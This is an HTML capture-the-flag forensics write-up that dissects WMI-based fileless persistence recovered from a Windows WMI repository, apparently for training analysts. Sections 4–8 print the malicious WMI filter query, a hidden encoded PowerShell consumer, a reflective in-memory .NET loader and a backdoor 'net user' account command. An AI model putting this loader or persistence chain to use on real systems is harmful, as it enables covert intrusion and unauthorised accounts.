@@ -1,0 +1,456 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>After Hours — Hacker Holidays 2026 Writeup</title>
+    <link rel="stylesheet" href="css/writeups.css">
+</head>
+<body>
+    <div class="container">
+
+        <!-- ===== HEADER ===== -->
+        <header class="room-header">
+            <div class="emoji-row">🐚 🌴🌴🥥🥥🍦🍹</div>
+            <h1>After Hours</h1>
+            <p class="subtitle">Bar closed. Guests asleep. Something on the network just clocked in for a shift off the rotation.</p>
+        </header>
+
+        <!-- ===== ROOM META ===== -->
+        <div class="room-meta">
+            <span class="badge"><span class="label">Points</span> 90</span>
+            <span class="badge"><span class="label">Category</span> Forensics</span>
+            <span class="badge"><span class="label">Difficulty</span> Medium</span>
+            <span class="badge"><span class="label">Time</span> 60 min</span>
+            <span class="badge"><span class="label">Event</span> Hacker Holidays · The Byte Lotus Hotel</span>
+        </div>
+
+        <!-- ===== INTRO IMAGE ===== -->
+        <figure>
+            <img src="images/after-hours-intro.png" alt="After Hours room banner — nighttime poolside at the Byte Lotus Hotel">
+        </figure>
+
+        <!-- ===== CONCIERGE BRIEFING ===== -->
+        <section>
+            <h2><span class="step-num">1</span> Concierge Briefing</h2>
+            <blockquote>
+                Long after the front desk closes and the pool lights dim, the resort's back-office machines keep humming. Someone, or something, has been logging in during the small hours, well after the night-shift technician has gone home. Nothing obvious shows up in Startup, Scheduled Tasks, or the registry Run keys. Whatever's keeping itself alive is hiding somewhere quieter, tucked away in a corner of the system most tools don't think to check.
+            </blockquote>
+            <p><strong>Tags:</strong> Forensics · Windows · Persistence · Reverse Engineering</p>
+        </section>
+
+        <!-- ===== INITIAL FILES ===== -->
+        <section>
+            <h2><span class="step-num">2</span> Initial File Inventory</h2>
+            <p>The room provided a ZIP archive containing five files. At first glance they appear cryptic — but they are not random. They are the core components of the <strong>Windows WMI repository</strong> (CIM repository), as documented by Microsoft Learn.</p>
+
+            <div class="code-block">
+                <span class="label">Luggage Room Contents</span>
+                <pre><code>/root/Rooms/hacker-holidays-2026/after-hours/
+├── INDEX.BTR
+├── MAPPING1.MAP
+├── MAPPING2.MAP
+├── MAPPING3.MAP
+└── OBJECTS.DATA</code></pre>
+            </div>
+
+            <div class="callout thinking">
+                <strong>Key Forensic Insight:</strong> This ZIP is a WMI repository artifact, not simply a collection of suspicious executables. Attackers can abuse WMI for stealthy, fileless persistence — exactly the kind of thing that bypasses Startup, Scheduled Tasks, and registry Run keys.
+            </div>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>File</th>
+                        <th>Purpose</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>OBJECTS.DATA</strong></td>
+                        <td>Primary WMI object store — holds class definitions, instances, and property data</td>
+                    </tr>
+                    <tr>
+                        <td><strong>INDEX.BTR</strong></td>
+                        <td>Binary tree index for fast object lookup within the repository</td>
+                    </tr>
+                    <tr>
+                        <td><strong>MAPPING1.MAP</strong></td>
+                        <td>Page-to-object mapping table (part 1 of 3)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>MAPPING2.MAP</strong></td>
+                        <td>Page-to-object mapping table (part 2 of 3)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>MAPPING3.MAP</strong></td>
+                        <td>Page-to-object mapping table (part 3 of 3)</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- ===== WMI PERSISTENCE PRIMER ===== -->
+        <section>
+            <h2><span class="step-num">3</span> WMI Persistence — A Primer</h2>
+            <p>To understand this room, you need to understand how WMI-based persistence differs from traditional methods.</p>
+
+            <p><strong>Traditional persistence (e.g. Registry Run key):</strong></p>
+            <div class="attack-chain">
+                <div class="node">Computer starts</div>
+                <div class="arrow">→</div>
+                <div class="node">Registry Run key</div>
+                <div class="arrow">→</div>
+                <div class="node">Malicious program starts</div>
+            </div>
+
+            <p><strong>WMI persistence:</strong></p>
+            <div class="attack-chain">
+                <div class="node">Windows starts</div>
+                <div class="arrow">→</div>
+                <div class="node">WMI service running</div>
+                <div class="arrow">→</div>
+                <div class="node">Event subscription waits</div>
+                <div class="arrow">→</div>
+                <div class="node">Condition occurs</div>
+                <div class="arrow">→</div>
+                <div class="node">WMI launches payload</div>
+                <div class="arrow">→</div>
+                <div class="node flag">Malicious code executes</div>
+            </div>
+
+            <p>The three critical WMI components that form a persistence subscription:</p>
+            <ol>
+                <li><strong>__EventFilter</strong> — defines <em>what event</em> triggers execution</li>
+                <li><strong>Event Consumer</strong> (e.g. <code>CommandLineEventConsumer</code>) — defines <em>what to execute</em></li>
+                <li><strong>__FilterToConsumerBinding</strong> — ties the filter and consumer together</li>
+            </ol>
+        </section>
+
+        <!-- ===== EXAMINING OBJECTS.DATA ===== -->
+        <section>
+            <h2><span class="step-num">4</span> Examining OBJECTS.DATA</h2>
+            <p>Using <code>strings</code> and a WMI repository parser against <code>OBJECTS.DATA</code>, several suspicious entries emerge.</p>
+
+            <h3>4.1 The Event Filter — <code>EngineTelemetryFilter</code></h3>
+            <div class="code-block">
+                <span class="label">Extracted Filter Query</span>
+                <pre><code>SELECT * FROM __InstanceModificationEvent
+WITHIN 60
+WHERE TargetInstance ISA 'Win32_LocalTime'
+AND TargetInstance.Minute = 30</code></pre>
+            </div>
+
+            <p><strong>Translation for beginners:</strong></p>
+            <ul>
+                <li><strong>__InstanceModificationEvent</strong> — monitor for changes to any WMI object</li>
+                <li><strong>WITHIN 60</strong> — poll approximately every 60 seconds</li>
+                <li><strong>Win32_LocalTime</strong> — the object being watched is Windows' local time</li>
+                <li><strong>Minute = 30</strong> — trigger when the minute value hits 30</li>
+            </ul>
+
+            <div class="callout thinking">
+                <strong>What this means:</strong> Every ~60 seconds, Windows checks the local time. If the current minute is 30 (e.g. 14:30, 15:30, 16:30...), the consumer fires. This is a <strong>time-based WMI persistence trigger</strong> — the attacker gets code execution once per hour, every hour, indefinitely.
+            </div>
+        </section>
+
+        <!-- ===== THE CONSUMER ===== -->
+        <section>
+            <h2><span class="step-num">5</span> The Consumer — <code>EngineTelemetryConsumer</code></h2>
+            <p>Alongside the filter, we find a <code>CommandLineEventConsumer</code> named <strong>EngineTelemetryConsumer</strong>. Its command property contains:</p>
+
+            <div class="code-block">
+                <span class="label">Consumer Command (truncated for readability)</span>
+                <pre><code>cmd /C powershell.exe -Sta -Nop -Window Hidden -enc &lt;BASE64_BLOB&gt;</code></pre>
+            </div>
+
+            <p><strong>Breakdown of the PowerShell flags:</strong></p>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Flag</th>
+                        <th>Meaning</th>
+                        <th>Forensic Significance</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>-Sta</strong></td>
+                        <td>Single-Threaded Apartment</td>
+                        <td>Not inherently malicious; common in scripting</td>
+                    </tr>
+                    <tr>
+                        <td><strong>-Nop</strong></td>
+                        <td>No Profile</td>
+                        <td>Prevents normal PowerShell profile from loading — avoids logging</td>
+                    </tr>
+                    <tr>
+                        <td><strong>-Window Hidden</strong></td>
+                        <td>Hide the PowerShell window</td>
+                        <td>🚩 <strong>Highly suspicious</strong> — user never sees the execution</td>
+                    </tr>
+                    <tr>
+                        <td><strong>-enc</strong></td>
+                        <td>Base64-encoded command</td>
+                        <td>🚩 <strong>Major red flag</strong> — classic obfuscation technique</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <div class="callout success">
+                <strong>Execution chain so far:</strong> WMI → time trigger (Minute=30) → CommandLineEventConsumer → cmd.exe → hidden PowerShell → Base64-encoded script
+            </div>
+        </section>
+
+        <!-- ===== DECODING LAYER 1 ===== -->
+        <section>
+            <h2><span class="step-num">6</span> Decoding Layer 1 — The PowerShell Script</h2>
+            <p>Base64 is <strong>encoding, not encryption</strong>. We decode the <code>-enc</code> blob to reveal the PowerShell logic:</p>
+
+            <div class="code-block">
+                <span class="label">Decoded PowerShell</span>
+                <pre><code>$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
+$o = New-Object IO.MemoryStream;
+$d = New-Object IO.Compression.DeflateStream(
+    [IO.MemoryStream][Convert]::FromBase64String($file),
+    [IO.Compression.CompressionMode]::Decompress
+);
+$d.CopyTo($o);
+[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null);</code></pre>
+            </div>
+
+            <p><strong>What this script does, step by step:</strong></p>
+            <ol>
+                <li>Retrieves the <code>ConfigData</code> property from a custom WMI class called <code>Win32_HardwareTelemetry</code></li>
+                <li>Base64-decodes that data</li>
+                <li>Decompresses it using Deflate (the same compression used in ZIP files)</li>
+                <li>Loads the resulting bytes directly into memory as a .NET assembly</li>
+                <li>Invokes the assembly's <code>EntryPoint</code> — executing the malicious payload</li>
+            </ol>
+
+            <div class="callout thinking">
+                <strong>Key takeaway:</strong> The attacker never writes a malicious .exe to disk. The payload lives entirely within the WMI repository as Base64-encoded, Deflate-compressed data. At runtime, it's reconstructed in memory and executed via <strong>Reflection.Assembly.Load()</strong> — a classic fileless / in-memory execution technique.
+            </div>
+        </section>
+
+        <!-- ===== EXTRACTING THE PAYLOAD ===== -->
+        <section>
+            <h2><span class="step-num">7</span> Extracting the Embedded Payload</h2>
+            <p>We locate <code>Win32_HardwareTelemetry</code> in <code>OBJECTS.DATA</code> and extract its <code>ConfigData</code> property — a large Base64 string. Applying the same transformation the PowerShell script uses:</p>
+
+            <div class="code-block">
+                <span class="label">Payload Extraction Process</span>
+                <pre><code>ConfigData (Base64 string)
+    │
+    ▼  [Convert]::FromBase64String()
+Base64 decode
+    │
+    ▼  DeflateStream(CompressionMode.Decompress)
+Deflate decompression
+    │
+    ▼
+Recovered executable</code></pre>
+                <span class="label">Output — First Two Bytes</span>
+                <pre class="output">MZ</pre>
+            </div>
+
+            <p><strong>MZ</strong> is the magic number for Windows PE (Portable Executable) files — the DOS header signature first defined by Mark Zbikowski. This confirms we have successfully recovered a Windows executable from the WMI repository.</p>
+
+            <figure>
+                <img src="images/after-hours-mz-header.png" alt="Hex dump showing 'MZ' at the start of the recovered PE file">
+            </figure>
+
+            <p>File identification of the recovered payload:</p>
+            <div class="code-block">
+                <span class="label">File Type</span>
+                <pre class="output">PE32 executable (GUI) Intel 80386, Mono/.Net assembly, for MS Windows</pre>
+            </div>
+        </section>
+
+        <!-- ===== REVERSE ENGINEERING THE .NET PAYLOAD ===== -->
+        <section>
+            <h2><span class="step-num">8</span> Static Analysis of the .NET Payload</h2>
+            <p>The payload is a <strong>.NET assembly</strong>, making it amenable to static analysis with tools like dnSpy, ILSpy, or even <code>strings</code>. Without executing it, we extract readable strings.</p>
+
+            <h3>8.1 Strings of Interest</h3>
+            <div class="code-block">
+                <span class="label">Key Strings from the .NET Payload</span>
+                <pre><code>cmd.exe
+/c net user patch
+/add</code></pre>
+            </div>
+
+            <p>One string stands out — a Base64-encoded argument passed to <code>net user</code>:</p>
+            <div class="code-block">
+                <span class="label">Encoded Argument</span>
+                <pre><code>&lt;REDACTED_BASE64&gt;</code></pre>
+            </div>
+
+            <h3>8.2 Decoding the Flag</h3>
+            <p>Decoding that Base64 string reveals the room's flag:</p>
+
+            <div class="flag-box">
+                <span class="flag-label">🚩 Flag</span>
+                <span class="flag-value">THM{REDACTED}</span>
+            </div>
+
+            <p>In the attacker's intended execution flow, this decodes to the password used with:</p>
+            <div class="code-block">
+                <span class="label">Malicious Command (reconstructed)</span>
+                <pre class="output">net user patch &lt;decoded_password&gt; /add</pre>
+            </div>
+
+            <p>The payload creates a local Windows user account named <strong>patch</strong> — a backdoor account for persistent access.</p>
+        </section>
+
+        <!-- ===== FULL ATTACK CHAIN ===== -->
+        <section>
+            <h2><span class="step-num">9</span> The Complete Attack Chain</h2>
+            <p>With all layers unwrapped, we can reconstruct the attacker's full persistence mechanism:</p>
+
+            <div class="attack-chain">
+                <div class="node">WMI Repository</div>
+                <div class="arrow">→</div>
+                <div class="node">__EventFilter<br><small>EngineTelemetryFilter</small></div>
+                <div class="arrow">→</div>
+                <div class="node">Win32_LocalTime<br><small>Minute = 30</small></div>
+                <div class="arrow">→</div>
+                <div class="node">CommandLineEventConsumer<br><small>EngineTelemetryConsumer</small></div>
+                <div class="arrow">→</div>
+                <div class="node">cmd.exe /C<br><small>hidden powershell</small></div>
+                <div class="arrow">→</div>
+                <div class="node">PowerShell<br><small>-enc Base64</small></div>
+                <div class="arrow">→</div>
+                <div class="node">Win32_HardwareTelemetry<br><small>ConfigData</small></div>
+                <div class="arrow">→</div>
+                <div class="node">Base64 + Deflate<br><small>decode</small></div>
+                <div class="arrow">→</div>
+                <div class="node">.NET Assembly<br><small>Reflection.Load()</small></div>
+                <div class="arrow">→</div>
+                <div class="node">net user patch ... /add</div>
+                <div class="arrow">→</div>
+                <div class="node flag">Backdoor Account<br><small>Created</small></div>
+            </div>
+        </section>
+
+        <!-- ===== WHY THIS EVADES DETECTION ===== -->
+        <section>
+            <h2><span class="step-num">10</span> Why This Evades Standard Tools</h2>
+            <p>The room's hint from @0xMia warns that "usual autoruns/persistence tools straight up don't catch this one." Here's why:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Evasion Technique</th>
+                        <th>How It Works Here</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Masquerading</strong></td>
+                        <td>Filter and consumer named <code>EngineTelemetry*</code> — sounds like a legitimate Microsoft component</td>
+                    </tr>
+                    <tr>
+                        <td><strong>WMI as storage</strong></td>
+                        <td>Payload lives as a property value inside the WMI repository — no suspicious files on disk</td>
+                    </tr>
+                    <tr>
+                        <td><strong>In-memory execution</strong></td>
+                        <td><code>Reflection.Assembly.Load()</code> loads the .NET payload directly into memory — never touches disk as an .exe</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Encoding + Compression</strong></td>
+                        <td>Base64 + Deflate obfuscate the payload — static signature scanners won't match</td>
+                    </tr>
+                    <tr>
+                        <td><strong>No traditional persistence artifact</strong></td>
+                        <td>No registry Run key, no Scheduled Task, no Startup folder entry — Autoruns won't find it</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- ===== FORENSIC ARTIFACTS SUMMARY ===== -->
+        <section>
+            <h2><span class="step-num">11</span> Forensic Artifacts Summary</h2>
+            <p>If this were a live investigation, here are the artifacts an analyst would hunt for:</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Artifact</th>
+                        <th>Location / Event ID</th>
+                        <th>What to Look For</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>WMI Subscriptions</strong></td>
+                        <td>ROOT\Subscription namespace</td>
+                        <td><code>EngineTelemetryFilter</code>, <code>EngineTelemetryConsumer</code>, __FilterToConsumerBinding</td>
+                    </tr>
+                    <tr>
+                        <td><strong>User Account Creation</strong></td>
+                        <td>Security Event ID <strong>4720</strong></td>
+                        <td>Account named <strong>patch</strong> created via <code>net user</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>Process Creation</strong></td>
+                        <td>Security Event ID <strong>4688</strong></td>
+                        <td><code>cmd.exe</code> spawning <code>powershell.exe</code> with <code>-Window Hidden -enc</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>PowerShell Logs</strong></td>
+                        <td>Event IDs <strong>4103 / 4104</strong></td>
+                        <td>Base64-encoded script blocks, <code>Reflection.Assembly::Load</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>WMI Activity</strong></td>
+                        <td>Microsoft-Windows-WMI-Activity log</td>
+                        <td>Event subscription creation and modification timestamps</td>
+                    </tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- ===== LESSONS LEARNED ===== -->
+        <section>
+            <h2><span class="step-num">12</span> Lessons Learned</h2>
+
+            <h3>For Beginners — A Mental Model for Persistence Forensics</h3>
+            <p><strong>Three questions to always ask:</strong></p>
+            <ol>
+                <li><strong>Persistence:</strong> How does the attacker make their code run again after reboot or logoff?</li>
+                <li><strong>Forensics:</strong> What evidence would that mechanism leave behind?</li>
+                <li><strong>Reverse Engineering:</strong> What does the suspicious program actually do?</li>
+            </ol>
+
+            <h3>Don't Trust Names</h3>
+            <p><strong>EngineTelemetryFilter</strong> and <strong>EngineTelemetryConsumer</strong> sound legitimate. That's intentional. Always examine <em>what an object triggers</em>, <em>what it executes</em>, and <em>where its payload comes from</em> — not what it calls itself.</p>
+
+            <h3>Base64 ≠ Encryption</h3>
+            <p>Base64 is reversible encoding. When you see <code>-enc</code> in a PowerShell command, the first thing you should do is decode it. Attackers use it for obfuscation, not confidentiality.</p>
+
+            <h3>Fileless ≠ Invisible</h3>
+            <p>In-memory execution via <code>Reflection.Assembly.Load()</code> avoids writing to disk, but it still leaves traces: WMI repository artifacts, PowerShell script block logs, process creation events, and (in this case) the user account itself.</p>
+        </section>
+
+        <!-- ===== FLAG ===== -->
+        <section>
+            <h2><span class="step-num">13</span> Flag</h2>
+            <div class="flag-box">
+                <span class="flag-label">🚩 Flag</span>
+                <span class="flag-value">THM{REDACTED}</span>
+            </div>
+            <p>Recovered by: identifying WMI persistence → decoding the Base64 PowerShell script → extracting <code>ConfigData</code> from <code>Win32_HardwareTelemetry</code> → Base64 decoding + Deflate decompressing the payload → extracting strings from the .NET assembly → decoding the final Base64 argument passed to <code>net user</code>.</p>
+        </section>
+
+        <!-- ===== FOOTER ===== -->
+        <footer class="footer">
+            <p>Hacker Holidays 2026 — <a href="#">The Byte Lotus Hotel</a></p>
+            <p>Writeup for educational purposes. Always obtain proper authorization before testing persistence techniques.</p>
+        </footer>
+
+    </div>
+</body>
+</html>
